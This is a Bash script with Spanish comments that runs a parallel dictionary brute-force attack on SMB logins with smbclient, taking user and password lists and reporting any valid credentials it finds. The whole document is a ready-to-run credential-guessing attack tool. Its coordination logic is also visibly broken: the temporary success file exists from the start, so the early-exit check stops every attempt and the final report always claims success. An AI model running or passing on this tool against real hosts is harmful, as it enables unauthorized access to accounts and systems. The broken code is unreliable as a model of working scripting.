#!/bin/bash

# Validación de número de argumentos
if [ "$#" -ne 4 ]; then
    echo "Uso: $0 <username_file> <password_file> <host> <port>"
    exit 1
fi

userfile=$1
paswfile=$2
host=$3
port=$4

# Verificar existencia de archivos
if [ ! -f "$userfile" ] || [ ! -f "$paswfile" ]; then
    echo "Error: No se encontró uno o ambos archivos: $userfile, $paswfile"
    exit 1
fi

echo "[*] Iniciando ataque SMB contra $host en el puerto $port..."

# Archivo temporal para coordinar procesos
success_file=$(mktemp)

# Función para probar credenciales
attack() {
    local usr="$1"
    local psw="$2"
    local host="$3"
    local port="$4"
    
    # Evitar ejecutar si ya se encontró un éxito
    [ -f "$success_file" ] && exit 0

    output=$(smbclient -L "$host" -U "$usr%$psw" -p "$port" 2>&1)
    if ! echo "$output" | grep -q "NT_STATUS"; then
        echo "[+] ¡Éxito! Usuario: $usr Contraseña: $psw"
        echo "$output" > "$success_file"
        kill 0  # Termina todos los procesos secundarios
    else
        echo "[-] Fallido: $usr:$psw"
    fi
}

# Exportar función y variables para paralelización
export -f attack
export host port success_file

# Ejecutar combinaciones en paralelo
while IFS= read -r usr; do
    while IFS= read -r psw; do
        attack "$usr" "$psw" "$host" "$port" &
    done < "$paswfile"
done < "$userfile"

# Esperar a que todos los procesos terminen
wait

# Mostrar resultado final
if [ -f "$success_file" ]; then
    echo "[*] Credenciales válidas encontradas:"
    cat "$success_file"
    rm "$success_file"
else
    echo "[*] Ataque finalizado. No se encontraron credenciales válidas."
fi

exit 0
